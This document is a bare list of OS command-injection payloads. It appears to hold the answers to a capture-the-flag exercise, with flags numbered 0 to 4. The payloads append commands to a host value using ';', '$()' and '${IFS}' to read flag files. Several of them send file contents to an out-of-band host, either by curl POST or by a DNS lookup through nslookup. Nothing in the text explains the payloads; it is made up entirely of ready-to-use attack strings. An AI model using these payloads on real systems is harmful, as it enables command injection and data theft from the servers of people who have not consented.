0-flag: google.com; cat /0-flag.txt
1-flag: google.com$(cat /etc/1-flag.txt)
2-flag: google.com;cat${IFS}/*/*2-flag.txt*
3-flag: google.com; curl http://wbymxygewoyuyyohmygyzsbpmd2whz4lv.oast.fun/ --data "$(cat /var/www/3-flag.txt)"

127.0.0.1; curl http://wbymxygewoyuyyohmygyzsbpmd2whz4lv.oast.fun/ --data "$(cat /bin/4-flag.txt)"

127.0.0.1; nslookup $(cat /bin/4-flag.txt).wbymxygewoyuyyohmygyzsbpmd2whz4lv.oast.fun;